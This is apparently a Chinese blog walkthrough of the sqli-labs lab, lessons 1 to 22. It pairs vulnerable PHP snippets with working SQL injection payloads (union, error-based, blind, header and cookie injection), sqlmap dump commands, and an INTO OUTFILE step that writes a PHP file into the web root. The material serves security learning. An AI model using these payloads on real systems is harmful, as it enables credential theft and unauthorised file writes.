<h3 id="3-2-Less-1-20"><a href="#3-2-Less-1-20" class="headerlink" title="3.2 Less 1-20"></a>3.2 Less 1-20</h3><h4 id="3-2-1-Less-1"><a href="#3-2-1-Less-1" class="headerlink" title="3.2.1 Less-1"></a>3.2.1 Less-1</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());  </span><br></pre></td></tr></tbody></table></figure>

<p><strong>联合注入</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>"security")<span class="operator">%</span><span class="number">23</span> # 查表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users")%23 # 查字段</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,password SEPARATOR <span class="number">0x3c62723e</span>) <span class="keyword">from</span> users)<span class="operator">%</span><span class="number">23</span> # <span class="number">0x3c62723e</span><span class="operator">=</span><span class="operator">&lt;</span>br<span class="operator">&gt;</span>，即按换行分割</span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=U -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>报错注入</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=E -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>布尔盲注</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 # 有回显</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span> <span class="operator">%</span><span class="number">23</span> # 无回显</span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=B -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>时间盲注</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;68,1,sleep(5)) %23</span></span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=T -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<h4 id="3-2-2-Less-2"><a href="#3-2-2-Less-2" class="headerlink" title="3.2.2 Less-2"></a>3.2.2 Less-2</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-3-Less-3"><a href="#3-2-3-Less-3" class="headerlink" title="3.2.3 Less-3"></a>3.2.3 Less-3</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=('<span class="subst">$id</span>') LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-4-Less-4"><a href="#3-2-4-Less-4" class="headerlink" title="3.2.4 Less-4"></a>3.2.4 Less-4</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-5-Less-5"><a href="#3-2-5-Less-5" class="headerlink" title="3.2.5 Less-5"></a>3.2.5 Less-5</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>不支持联合查询。</p>
<h4 id="3-2-6-Less-6"><a href="#3-2-6-Less-6" class="headerlink" title="3.2.6 Less-6"></a>3.2.6 Less-6</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式不一样。</p>
<h4 id="3-2-7-Less-7"><a href="#3-2-7-Less-7" class="headerlink" title="3.2.7 Less-7"></a>3.2.7 Less-7</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=(('<span class="subst">$id</span>')) LIMIT 0,1"</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You have an error in your SQL syntax"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><strong>布尔盲注</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 //正常回显</span></span><br><span class="line"><span class="string">?id=1'</span>))<span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span> <span class="operator">%</span><span class="number">23</span> <span class="operator">/</span><span class="operator">/</span>报错</span><br></pre></td></tr></tbody></table></figure>

<p><strong>时间盲注</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67,1,sleep(5)) %23 //不延时</span></span><br><span class="line"><span class="string">?id=1'</span>))<span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span>,<span class="number">1</span>,sleep(<span class="number">5</span>)) <span class="operator">%</span><span class="number">23</span> <span class="operator">/</span><span class="operator">/</span>延时</span><br></pre></td></tr></tbody></table></figure>

<p><strong>outfile</strong></p>
<p>这里因为提示<code>Use outfile</code>，因此可以尝试写文件。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ mysql -e <span class="string">"show global variables like '%secure%';"</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></tbody></table></figure>

<p>当<code>secure_file_priv</code>为<code>null</code>时，表示限制<code>mysql</code>不允许导入导出。</p>
<p>当<code>secure_file_priv</code>为<code>/tmp</code>时，表示限制<code>mysql</code>只能在<code>/tmp</code>目录下导入导出。</p>
<p>当<code>secure_file_priv</code>为<code>空</code>时，表示限制<code>mysql</code>不对导入导出做限制。</p>
<p>这里还需要赋予文件写入的权限</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> -R 777 /var/www/html</span><br></pre></td></tr></tbody></table></figure>

<p>然后执行sql语句</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))union select * from security.users into outfile "/var/www/html/Less-7/user.txt"%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310220651812.png" class="" title="image-20250310220651812">

<p>这里也可以写入shell</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))union select 1,2,"&lt;?php phpinfo();?&gt;" into outfile "/var/www/html/Less-7/info.php"%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310220934038.png" class="" title="image-20250310220934038">

<h4 id="3-2-8-Less-8"><a href="#3-2-8-Less-8" class="headerlink" title="3.2.8 Less-8"></a>3.2.8 Less-8</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="comment">//echo "You have an error in your SQL syntax";</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-9-Less-9"><a href="#3-2-9-Less-9" class="headerlink" title="3.2.9 Less-9"></a>3.2.9 Less-9</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>只能用延时注入。</p>
<h4 id="3-2-10-Less-10"><a href="#3-2-10-Less-10" class="headerlink" title="3.2.10 Less-10"></a>3.2.10 Less-10</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-11-Less-11"><a href="#3-2-11-Less-11" class="headerlink" title="3.2.11 Less-11"></a>3.2.11 Less-11</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username='<span class="subst">$uname</span>' and password='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>与Less-1一致。</p>
<h4 id="3-2-12-Less-12"><a href="#3-2-12-Less-12" class="headerlink" title="3.2.12 Less-12"></a>3.2.12 Less-12</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-13-Less-13"><a href="#3-2-13-Less-13" class="headerlink" title="3.2.13 Less-13"></a>3.2.13 Less-13</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=('<span class="subst">$uname</span>') and password=('<span class="subst">$passwd</span>') LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变，不能用联合查询。</p>
<h4 id="3-2-14-Less-14"><a href="#3-2-14-Less-14" class="headerlink" title="3.2.14 Less-14"></a>3.2.14 Less-14</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-15-Less-15"><a href="#3-2-15-Less-15" class="headerlink" title="3.2.15 Less-15"></a>3.2.15 Less-15</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username='<span class="subst">$uname</span>' and password='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变，不能使用报错。</p>
<h4 id="3-2-16-Less-16"><a href="#3-2-16-Less-16" class="headerlink" title="3.2.16 Less-16"></a>3.2.16 Less-16</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合类型改变。</p>
<h4 id="3-2-17-Less-17"><a href="#3-2-17-Less-17" class="headerlink" title="3.2.17 Less-17"></a>3.2.17 Less-17</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//过滤</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$update</span>=<span class="string">"UPDATE users SET password = '<span class="subst">$passwd</span>' WHERE username='<span class="subst">$row1</span>'"</span>;</span><br><span class="line">	<span class="keyword">if</span> error</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>uname</code>被过滤了，只能考虑update这里注入，使用报错注入即可。</p>
<h4 id="3-2-18-Less-18"><a href="#3-2-18-Less-18" class="headerlink" title="3.2.18 Less-18"></a>3.2.18 Less-18</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="comment">//uname和passwd被过滤</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="subst">$uagent</span>', '<span class="subst">$IP</span>', <span class="subst">$uname</span>)"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .<span class="variable">$uagent</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>这里<code>uname</code>和<code>passwd</code>被过滤了，因此只能在insert语句注入。</p>
<ul>
<li><code>$_SERVER['HTTP_CLIENT_IP']</code> 客户端可以伪造。</li>
<li><code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，客户端可以伪造。</li>
<li><code>$_SERVER['REMOTE_ADDR']</code>，客户端不能伪造。</li>
</ul>
<p>所以这里只能在<code>User-Agent</code>注入。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="number">1</span><span class="string">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310224830354.png" class="" title="image-20250310224830354">

<h4 id="3-2-19-Less-19"><a href="#3-2-19-Less-19" class="headerlink" title="3.2.19 Less-19"></a>3.2.19 Less-19</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="comment">//uname和passwd被过滤</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="subst">$uagent</span>', '<span class="subst">$IP</span>')"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Referer is: '</span> .<span class="variable">$uagent</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>User-Agent</code>改为了<code>Referer</code>。</p>
<h4 id="3-2-20-Less-20"><a href="#3-2-20-Less-20" class="headerlink" title="3.2.20 Less-20"></a>3.2.20 Less-20</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'uname'</span>]))</span><br><span class="line">    <span class="comment">//过滤uname和passwd</span></span><br><span class="line">    <span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">    <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">'uname'</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username='<span class="subst">$cookee</span>' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">            <span class="string">"输出查询的信息"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">'uname'</span>, <span class="variable">$row1</span>[<span class="string">'username'</span>], <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>就是从<code>Cookie</code>中读取<code>uname</code>值，产生注入。</p>
<h3 id="3-3-Less21-37"><a href="#3-3-Less21-37" class="headerlink" title="3.3 Less21-37"></a>3.3 Less21-37</h3><h4 id="3-3-1-Less-21"><a href="#3-3-1-Less-21" class="headerlink" title="3.3.1 Less-21"></a>3.3.1 Less-21</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username=('<span class="subst">$cookee</span>') LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>只节选了相关代码，其余与<code>Less-20</code>大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=<span class="string">"uname=*"</span> --tamper=<span class="string">"base64encode"</span> -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310230842396.png" class="" title="image-20250310230842396">

<h4 id="3-3-2-Less-22"><a href="#3-3-2-Less-22" class="headerlink" title="3.3.2 Less-22"></a>3.3.2 Less-22</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$cookee1</span> = <span class="string">'"'</span>. <span class="variable">$cookee</span>. <span class="string">'"'</span>;    </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变</p>
